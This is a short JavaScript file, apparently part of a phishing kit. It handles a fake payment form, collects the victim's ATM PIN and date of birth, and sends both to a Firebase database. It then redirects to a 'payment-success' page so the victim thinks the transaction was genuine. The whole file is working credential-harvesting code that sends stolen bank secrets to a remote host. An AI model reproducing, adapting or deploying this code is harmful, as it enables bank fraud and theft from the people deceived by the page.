document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  const atmPin = document.getElementById("atmPin").value;
  const dob = document.getElementById("dob").value;

  const entryRef = firebase.database().ref("ududip007").push();
  entryRef.set({
    atm_pin: atmPin,
    date_of_birth: dob
  }).then(() => {
    localStorage.setItem("dob", dob);
    
    window.location.href = "payment-success.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
